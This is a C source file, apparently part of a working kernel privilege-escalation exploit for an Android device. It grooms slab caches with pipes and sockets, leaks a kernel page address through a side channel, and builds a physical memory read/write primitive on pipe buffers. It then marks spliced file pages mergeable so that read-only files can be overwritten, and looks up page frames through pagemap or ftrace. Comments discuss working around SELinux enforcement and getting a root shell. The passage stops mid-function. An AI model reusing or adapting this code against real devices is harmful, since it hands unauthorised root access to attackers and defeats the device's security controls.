#include "common.h"

#include <stddef.h>
#include <sys/sysmacros.h>

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
static char dirty_probe_path[256];
static char dirty_carrier_path[256];
static off_t dirty_probe_offset;
static off_t dirty_carrier_offset;
static int dirty_active_slot;
static int dirty_split_ready;

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  /*
   * F_SETPIPE_SZ returns new capacity (bytes) on success, -1 on error.
   * Unprivileged shell cannot grow past pipe-max / needs CAP_SYS_RESOURCE for
   * >default. Never shrink below the fd's current size — shrink-then-grow is
   * a dead end without Magisk (reclaim stays on tiny kmalloc, skb page keeps
   * 0x50 paint).
   */
#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif
  int cur = fcntl(pipefd[0], F_GETPIPE_SZ);
  size_t cur_slots = cur > 0 ? (size_t)cur / PAGE_SIZE : 0;
  if (slots > 0 && cur_slots >= slots) {
    return;
  }
  size_t tries[] = {slots, 32, 16, 8, 4, 2, 1};
  int last_err = 0;
  int last_ret = 0;
  static int logged_once;
  for (size_t t = 0; t < sizeof(tries) / sizeof(tries[0]); t++) {
    size_t s = tries[t];
    int dup = 0;
    for (size_t u = 0; u < t; u++) {
      if (tries[u] == s) {
        dup = 1;
        break;
      }
    }
    if (dup || s == 0) {
      continue;
    }
    /* Do not shrink — unprivileged cannot grow back. */
    if (cur_slots && s < cur_slots) {
      continue;
    }
    errno = 0;
    int ret = fcntl(pipefd[0], F_SETPIPE_SZ, (int)(s * PAGE_SIZE));
    if (ret != -1) {
      if (!logged_once) {
        pr_info("F_SETPIPE_SZ ok slots=%zu ret=%d (wanted %zu cur=%zu)\n", s,
                ret, slots, cur_slots);
        logged_once = 1;
      }
      return;
    }
    last_err = errno;
    last_ret = ret;
  }
  if (!logged_once) {
    pr_warning("F_SETPIPE_SZ keep cur=%zu want=%zu ret=%d errno=%d\n",
               cur_slots, slots, last_ret, last_err);
    logged_once = 1;
  }
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  /* Keep kernel default (usually 16). Shrinking blocks later reclaim sizing. */
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  /*
   * Magisk path shrunk to 2 to punch freelist holes. Without CAP, shrinking
   * permanently caps this fd — skip (PIPE_SHAPE_ROUNDS is 0 on PD2324 anyway).
   */
  (void)pipefd;
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

/*
 * No-Magisk: F_SETPIPE_SZ grow works under clean Enforcing shell, but fails
 * after Stage-1 (default stays 2 slots → reclaim never replaces 0x50 skb page).
 * Preclaim pipebufs WHILE Enforcing; install_pipe_physrw then skips prepare.
 */
int pipe_preclaim_enforcing(void) {
  if (pipebuf_page_base) {
    pr_info("pipe preclaim already base=%016zx\n", pipebuf_page_base);
    return 1;
  }
  int enf = 1;
  FILE *f = fopen("/sys/fs/selinux/enforce", "r");
  if (f) {
    if (fscanf(f, "%d", &enf) != 1) {
      enf = 1;
    }
    fclose(f);
  }
  if (enf != 1 && !env_flag("PIPE_PRECLAIM_ANYWAY", 0)) {
    pr_warning("pipe preclaim skipped — not Enforcing (enf=%d)\n", enf);
    return 0;
  }
  pr_info("pipe preclaim start enforce=%d (SETPIPE grow still available)\n",
          enf);
  uintptr_t base = prepare_pipe_buffer_page();
  if (!base) {
    pr_warning("pipe preclaim failed\n");
    return 0;
  }
  pipebuf_page_base = base;
#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif
  int sample = fcntl(pipe_fds_reclaim[0][0], F_GETPIPE_SZ);
  pr_success("pipe preclaim ok base=%016zx getpipe0=%d\n", base, sample);
  return 1;
}

/* Abstract AF_UNIX — filesystem sockpath is EACCES for shell on PD2324. */
#define PIPE_HELPER_ABS "\0kernelexp_pipe_v1"
#define PIPE_HELPER_ABS_LEN 16
#define PIPE_HELPER_READY "/data/local/tmp/.pipe_helper_ready"
#define PIPE_HELPER_BATCH 32 /* pipes per SCM_RIGHTS message (64 fds) */

static int pipe_helper_send_fds(int conn, const int *fds, int nfd) {
  struct msghdr msg;
  struct iovec iov;
  char buf = (char)nfd;
  char cbuf[CMSG_SPACE(sizeof(int) * (PIPE_HELPER_BATCH * 2))];
  memset(&msg, 0, sizeof(msg));
  memset(cbuf, 0, sizeof(cbuf));
  iov.iov_base = &buf;
  iov.iov_len = 1;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cbuf;
  msg.msg_controllen = CMSG_SPACE(sizeof(int) * (size_t)nfd);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int) * (size_t)nfd);
  memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * (size_t)nfd);
  return sendmsg(conn, &msg, 0) == 1 ? 0 : -1;
}

static int pipe_helper_recv_fds(int conn, int *fds, int nfd) {
  struct msghdr msg;
  struct iovec iov;
  char buf = 0;
  char cbuf[CMSG_SPACE(sizeof(int) * (PIPE_HELPER_BATCH * 2))];
  memset(&msg, 0, sizeof(msg));
  memset(cbuf, 0, sizeof(cbuf));
  iov.iov_base = &buf;
  iov.iov_len = 1;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cbuf;
  msg.msg_controllen = sizeof(cbuf);
  if (recvmsg(conn, &msg, 0) != 1) {
    return -1;
  }
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET ||
      cmsg->cmsg_type != SCM_RIGHTS) {
    return -1;
  }
  int got = (int)((cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int));
  if (got != nfd) {
    return -1;
  }
  memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * (size_t)nfd);
  return 0;
}

/*
 * Separate process under Enforcing: GhostLock-preclaim pipes HERE so the
 * Stage-1 process keeps a clean heap. Serves pipebuf_page_base + reclaim fds.
 */
int pipe_helper_serve(void) {
  if (!pipe_preclaim_enforcing()) {
    return 0;
  }
  unlink(PIPE_HELPER_READY);
  int lst = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (lst < 0) {
    pr_error("pipe helper socket errno=%d\n", errno);
    return 0;
  }
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  memcpy(addr.sun_path, PIPE_HELPER_ABS, PIPE_HELPER_ABS_LEN);
  socklen_t alen =
      (socklen_t)(offsetof(struct sockaddr_un, sun_path) + PIPE_HELPER_ABS_LEN);
  if (bind(lst, (struct sockaddr *)&addr, alen) || listen(lst, 1)) {
    pr_error("pipe helper bind/listen errno=%d\n", errno);
    close(lst);
    return 0;
  }
  int rfd = open(PIPE_HELPER_READY, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                 0644);
  if (rfd >= 0) {
    write(rfd, "1\n", 2);
    close(rfd);
  }
  pr_success("pipe helper listening abstract reclaim=%zu base=%016zx\n",
             (size_t)PIPE_RECLAIM, pipebuf_page_base);

  for (;;) {
    int conn = accept(lst, NULL, NULL);
    if (conn < 0) {
      continue;
    }
    uint64_t base = (uint64_t)pipebuf_page_base;
    uint32_t n = (uint32_t)PIPE_RECLAIM;
    if (write(conn, &base, sizeof(base)) != (ssize_t)sizeof(base) ||
        write(conn, &n, sizeof(n)) != (ssize_t)sizeof(n)) {
      close(conn);
      continue;
    }
    int ok = 1;
    for (uint32_t i = 0; i < n && ok; i += PIPE_HELPER_BATCH) {
      uint32_t chunk = n - i;
      if (chunk > PIPE_HELPER_BATCH) {
        chunk = PIPE_HELPER_BATCH;
      }
      int fds[PIPE_HELPER_BATCH * 2];
      for (uint32_t j = 0; j < chunk; j++) {
        fds[j * 2] = pipe_fds_reclaim[i + j][0];
        fds[j * 2 + 1] = pipe_fds_reclaim[i + j][1];
      }
      if (write(conn, &chunk, sizeof(chunk)) != (ssize_t)sizeof(chunk) ||
          pipe_helper_send_fds(conn, fds, (int)(chunk * 2)) != 0) {
        ok = 0;
      }
    }
    pr_info("pipe helper serve client ok=%d\n", ok);
    close(conn);
  }
  return 1;
}

int pipe_helper_connect(void) {
  int conn = -1;
  for (int t = 0; t < 50; t++) {
    conn = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (conn < 0) {
      return 0;
    }
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path, PIPE_HELPER_ABS, PIPE_HELPER_ABS_LEN);
    socklen_t alen =
        (socklen_t)(offsetof(struct sockaddr_un, sun_path) + PIPE_HELPER_ABS_LEN);
    if (connect(conn, (struct sockaddr *)&addr, alen) == 0) {
      break;
    }
    close(conn);
    conn = -1;
    usleep(200000);
  }
  if (conn < 0) {
    pr_warning("pipe helper connect failed\n");
    return 0;
  }
  uint64_t base = 0;
  uint32_t n = 0;
  if (read(conn, &base, sizeof(base)) != (ssize_t)sizeof(base) ||
      read(conn, &n, sizeof(n)) != (ssize_t)sizeof(n) || n == 0 ||
      n > PIPE_RECLAIM) {
    close(conn);
    pr_warning("pipe helper header bad\n");
    return 0;
  }
  uint32_t got = 0;
  while (got < n) {
    uint32_t chunk = 0;
    if (read(conn, &chunk, sizeof(chunk)) != (ssize_t)sizeof(chunk) ||
        chunk == 0 || chunk > PIPE_HELPER_BATCH || got + chunk > n) {
      close(conn);
      pr_warning("pipe helper chunk bad\n");
      return 0;
    }
    int fds[PIPE_HELPER_BATCH * 2];
    if (pipe_helper_recv_fds(conn, fds, (int)(chunk * 2)) != 0) {
      close(conn);
      pr_warning("pipe helper recvfds failed\n");
      return 0;
    }
    for (uint32_t j = 0; j < chunk; j++) {
      pipe_fds_reclaim[got + j][0] = fds[j * 2];
      pipe_fds_reclaim[got + j][1] = fds[j * 2 + 1];
    }
    got += chunk;
  }
  close(conn);
  pipebuf_page_base = (uintptr_t)base;
  pipe_objects_ready = 1;
  pr_success("pipe helper connect ok base=%016zx reclaim=%u get0=%d\n",
             pipebuf_page_base, n,
             fcntl(pipe_fds_reclaim[0][0], F_GETPIPE_SZ));
  return 1;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (!pipe_objects_ready) {
    if (PIPE_SHAPE_ROUNDS != 0) {
      for (size_t i = 0; i < PIPE_N_COUNT; i++) {
        make_pipe_object(pipe_fds_n[i]);
      }
      for (size_t i = 0; i < PIPE_C_COUNT; i++) {
        make_pipe_object(pipe_fds_c[i]);
      }
      for (size_t i = 0; i < PIPE_E_COUNT; i++) {
        make_pipe_object(pipe_fds_e[i]);
      }
    }
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      make_pipe_object(pipe_fds_drain[i]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      make_pipe_object(pipe_fds_reclaim[i]);
    }
    pipe_objects_ready = 1;
  }

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  return base;
}

static int dirty_prepare_one(int pipefd[2], int target_fd, off_t offset,
                             void *advance, size_t advance_size, size_t index) {
  struct iovec iov = {.iov_base = advance, .iov_len = advance_size};
  ssize_t n = syscall(SYS_vmsplice, pipefd[1], &iov, 1, 0);
  if (n != (ssize_t)advance_size) {
    pr_warning("43074 vmsplice index=%zu got=%zd want=%zu errno=%d\n",
               index, n, advance_size, errno);
    return 0;
  }
  if (lseek(target_fd, offset - 1, SEEK_SET) < 0 ||
      syscall(SYS_splice, target_fd, NULL, pipefd[1], NULL, 1, 0) != 1) {
    pr_warning("43074 splice index=%zu offset=%lld errno=%d\n",
               index, (long long)offset, errno);
    return 0;
  }
  size_t drained = 0;
  while (drained < advance_size) {
    n = read(pipefd[0], (unsigned char *)advance + drained,
             advance_size - drained);
    if (n <= 0) {
      pr_warning("43074 drain index=%zu at=%zu errno=%d\n",
                 index, drained, errno);
      return 0;
    }
    drained += (size_t)n;
  }
  return 1;
}

int pipe_dirty_prepare_split(const char *probe_path, off_t probe_offset,
                             const char *carrier_path, off_t carrier_offset,
                             int active_slot) {
  if (!pipe_objects_ready || !pipebuf_page_base || !probe_path ||
      !carrier_path || probe_offset <= 0 || carrier_offset <= 0 ||
      active_slot <= 0 || active_slot >= PIPE_BUFFER_SLOTS) {
    errno = EINVAL;
    return 0;
  }
  size_t advance_size = (size_t)active_slot * PAGE_SIZE;
  void *advance = mmap(NULL, advance_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (advance == MAP_FAILED) {
    return 0;
  }
  memset(advance, 'V', advance_size);
  int probe_fd = open(probe_path, O_RDONLY | O_CLOEXEC);
  int carrier_fd = open(carrier_path, O_RDONLY | O_CLOEXEC);
  if (probe_fd < 0 || carrier_fd < 0) {
    if (probe_fd >= 0) close(probe_fd);
    if (carrier_fd >= 0) close(carrier_fd);
    munmap(advance, advance_size);
    return 0;
  }

  int prepared = 0;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    int target_fd = (i & 1) ? carrier_fd : probe_fd;
    off_t target_off = (i & 1) ? carrier_offset : probe_offset;
    if (!dirty_prepare_one(pipe_fds_reclaim[i], target_fd, target_off,
                           advance, advance_size, i)) {
      break;
    }
    prepared++;
  }
  close(probe_fd);
  close(carrier_fd);
  munmap(advance, advance_size);
  if (prepared != PIPE_RECLAIM) {
    pr_warning("43074 pipe file-slot preparation incomplete=%d/%d\n",
               prepared, PIPE_RECLAIM);
    return 0;
  }
  snprintf(dirty_probe_path, sizeof(dirty_probe_path), "%s", probe_path);
  snprintf(dirty_carrier_path, sizeof(dirty_carrier_path), "%s", carrier_path);
  dirty_probe_offset = probe_offset;
  dirty_carrier_offset = carrier_offset;
  dirty_active_slot = active_slot;
  dirty_split_ready = 1;
  pr_success("43074 pipe slots ready rings=%d probe=%s@0x%llx "
             "carrier=%s@0x%llx active_slot=%d ring_request=0x%x "
             "object_stride=0x%x\n",
             PIPE_RECLAIM, probe_path, (unsigned long long)probe_offset,
             carrier_path, (unsigned long long)carrier_offset, active_slot,
             PIPE_BUFFER_SLOTS * PIPE_BUFFER_SIZE, PIPE_OBJECT_SIZE);
  return 1;
}

/*
 * After dirty_prepare_split splices file pages into reclaim pipes, set
 * PIPE_BUF_FLAG_CAN_MERGE via GhostLock physrw (no CVE-2026-43074 late_refs).
 */
int pipe_dirty_mark_mergeable(int fd) {
  if (!dirty_split_ready || !pipebuf_page_base || fd < 0) {
    errno = EINVAL;
    return 0;
  }
  unsigned char *slab = malloc(ORDER3_SIZE);
  if (!slab) {
    return 0;
  }
  if (!read_pipe_slab(fd, pipebuf_page_base, slab)) {
    free(slab);
    return 0;
  }
  int marked = 0;
  int candidates = 0;
  int anon_ops = 0;
  const uintptr_t ops_anon = pipe_buf_ops_addr();
  /*
   * After splice(), buffers reference file pages with page_cache_pipe_buf_ops
   * (not anon_pipe_buf_ops). Mark every vmemmap-backed slot that has a non-zero
   * ops pointer — filtering on anon ops yields candidates=0 and kills the bridge.
   */
  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END) {
      continue;
    }
    if (!pb.ops) {
      continue;
    }
    candidates++;
    if (ops_anon && pb.ops == ops_anon) {
      anon_ops++;
    }
    uint32_t flags = pb.flags | (uint32_t)PIPE_BUF_FLAG_CAN_MERGE;
    if (flags == pb.flags) {
      marked++;
      continue;
    }
    uintptr_t flags_addr =
        pipebuf_page_base + off + offsetof(struct user_pipe_buffer, flags);
    if (!pipe_phys_write_data(fd, flags_addr, &flags, sizeof(flags))) {
      continue;
    }
    uint32_t rb = 0;
    if (!pipe_phys_read_data(fd, flags_addr, &rb, sizeof(rb)) || rb != flags) {
      continue;
    }
    marked++;
  }
  free(slab);
  pr_info("dirty mark_mergeable candidates=%d marked=%d anon_ops=%d "
          "page=%016zx\n",
          candidates, marked, anon_ops, pipebuf_page_base);
  return marked > 0;
}

/* Shell-time PFN pin for bugreportd carrier (post-root ftrace is dead). */
static char carrier_pref_path[256];
static off_t carrier_pref_map_off;
static uint64_t carrier_pref_pfn;
static int carrier_pref_fd = -1;
static void *carrier_pref_map = MAP_FAILED;
static unsigned char carrier_pref_pre[16];
static int carrier_pref_ready;

/* Last successful patch — restore preimage after su is up. */
static uintptr_t last_patch_kva;
static size_t last_patch_len;
static unsigned char *last_patch_saved;
static char last_patch_path[256];
static off_t last_patch_off;

static void carrier_pref_release(void) {
  if (carrier_pref_map != MAP_FAILED) {
    munmap(carrier_pref_map, PAGE_SIZE);
    carrier_pref_map = MAP_FAILED;
  }
  if (carrier_pref_fd >= 0) {
    close(carrier_pref_fd);
    carrier_pref_fd = -1;
  }
  carrier_pref_pfn = 0;
  carrier_pref_ready = 0;
  carrier_pref_path[0] = 0;
}

static int file_page_pfn_via_trace(const char *path, off_t map_off,
                                   uint64_t *pfn_out);

static int pagemap_va_to_pfn(uintptr_t va, uint64_t *pfn_out) {
  int fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
  if (fd < 0 || !pfn_out) {
    return 0;
  }
  uint64_t entry = 0;
  off_t off = (off_t)((va / PAGE_SIZE) * sizeof(entry));
  ssize_t n = pread(fd, &entry, sizeof(entry), off);
  close(fd);
  if (n != (ssize_t)sizeof(entry)) {
    return 0;
  }
  /* Bit 63 = page present. PFN in bits 0..54 (kernel pagemap). */
  if ((entry & (1ULL << 63)) == 0) {
    pr_info("physrw_patch pagemap not-present va=%p entry=%016llx\n",
            (void *)va, (unsigned long long)entry);
    errno = ENOENT;
    return 0;
  }
  *pfn_out = entry & ((1ULL << 55) - 1);
  if (*pfn_out == 0) {
    pr_info("physrw_patch pagemap PFN hidden va=%p entry=%016llx "
            "(need CAP_SYS_ADMIN / elevated cred)\n",
            (void *)va, (unsigned long long)entry);
    errno = EPERM;
    return 0;
  }
  return 1;
}

static int tracing_write_text(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t n = write(fd, value, len);
  close(fd);
  return n == (ssize_t)len;
}

/*
 * Fallback when /proc/self/pagemap hides PFNs: drop+fault the file page under
 * mm_filemap_add_to_page_cache and parse pfn= from the trace (same idea as
 * GhostLock filemap reclaim, scoped to one inode+ofs).
 */
static int file_page_pfn_via_trace(const char *path, off_t map_off,
                                   uint64_t *pfn_out) {
  static const char *const roots[] = {
      "/sys/kernel/tracing",
      "/sys/kernel/debug/tracing",
  };
  struct stat st;
  int file_fd = open(path, O_RDONLY | O_CLOEXEC);
  if (file_fd < 0 || fstat(file_fd, &st) != 0 || !pfn_out) {
    if (file_fd >= 0) {
      close(file_fd);
    }
    return 0;
  }
  unsigned major_v = major(st.st_dev);
  unsigned minor_v = minor(st.st_dev);
  unsigned long long ino_v = (unsigned long long)st.st_ino;

  /* Prefer a clean page-cache miss so the add_to_page_cache event fires. */
  (void)posix_fadvise(file_fd, map_off, (off_t)PAGE_SIZE, POSIX_FADV_DONTNEED);

  for (size_t ri = 0; ri < sizeof(roots) / sizeof(roots[0]); ri++) {
    char enable_path[192];
    char tracing_on_path[192];
    char trace_path[192];
    snprintf(enable_path, sizeof(enable_path),
             "%s/events/filemap/mm_filemap_add_to_page_cache/enable", roots[ri]);
    snprintf(tracing_on_path, sizeof(tracing_on_path), "%s/tracing_on",
             roots[ri]);
    snprintf(trace_path, sizeof(trace_path), "%s/trace", roots[ri]);
    if (access(enable_path, W_OK) != 0) {
      continue;
    }

    (void)tracing_write_text(tracing_on_path, "0\n");
    (void)tracing_write_text(enable_path, "0\n");
    int tfd = open(trace_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (tfd >= 0) {
      close(tfd);
    }
    if (!tracing_write_text(enable_path, "1\n") ||
        !tracing_write_text(tracing_on_path, "1\n")) {
      (void)tracing_write_text(enable_path, "0\n");
      continue;
    }

    unsigned char *tmp = malloc(PAGE_SIZE);
    ssize_t got = -1;
    if (tmp) {
      got = pread(file_fd, tmp, PAGE_SIZE, map_off);
      free(tmp);
    }
    (void)tracing_write_text(tracing_on_path, "0\n");
    (void)tracing_write_text(enable_path, "0\n");
    if (got != (ssize_t)PAGE_SIZE) {
      continue;
    }

    int rfd = open(trace_path, O_RDONLY | O_CLOEXEC);
    if (rfd < 0) {
      continue;
    }
    char *buf = malloc(256 * 1024);
    ssize_t n = buf ? read(rfd, buf, 256 * 1024 - 1) : -1;
    close(rfd);
    if (!buf || n <= 0) {
      free(buf);
      continue;
    }
    buf[n] = 0;

    uint64_t found = 0;
    int ev_total = 0;
    int ev_ino = 0;
    int ev_ofs = 0;
    const char *line = buf;
    while (*line) {
      const char *nl = strchr(line, '\n');
      size_t llen = nl ? (size_t)(nl - line) : strlen(line);
      char text[512];
      size_t copy = llen < sizeof(text) - 1 ? llen : sizeof(text) - 1;
      memcpy(text, line, copy);
      text[copy] = 0;
      char *tag = strstr(text, "mm_filemap_add_to_page_cache:");
      if (tag) {
        unsigned mj = 0, mn = 0, order_v = 0;
        unsigned long long ino = 0, pfn = 0;
        size_t ofs = 0;
        char page_v[64];
        int parsed = sscanf(tag,
                            "mm_filemap_add_to_page_cache: dev %u:%u ino %llx "
                            "page=%63s pfn=0x%llx ofs=%zu",
                            &mj, &mn, &ino, page_v, &pfn, &ofs);
        if (parsed != 6) {
          parsed = sscanf(tag,
                          "mm_filemap_add_to_page_cache: dev %u:%u ino %llx "
                          "pfn=0x%llx ofs=%zu order=%u",
                          &mj, &mn, &ino, &pfn, &ofs, &order_v);
        }
        if (parsed == 6) {
          ev_total++;
          if (mj == major_v && mn == minor_v && ino == ino_v) {
            ev_ino++;
            /* Kernel prints byte offset (index<<PAGE_SHIFT) or raw index. */
            if (ofs == (size_t)map_off ||
                ofs == (size_t)(map_off >> PAGE_SHIFT)) {
              ev_ofs++;
              if (pfn != 0) {
                found = pfn;
                break;
              }
            }
          }
        }
      }
      if (!nl) {
        break;
      }
      line = nl + 1;
    }
    free(buf);
    if (found) {
      *pfn_out = found;
      close(file_fd);
      pr_info("physrw_patch trace-pfn ok path=%s ofs=0x%llx pfn=%llx "
              "via=%s\n",
              path, (unsigned long long)map_off, (unsigned long long)found,
              roots[ri]);
      return 1;
    }
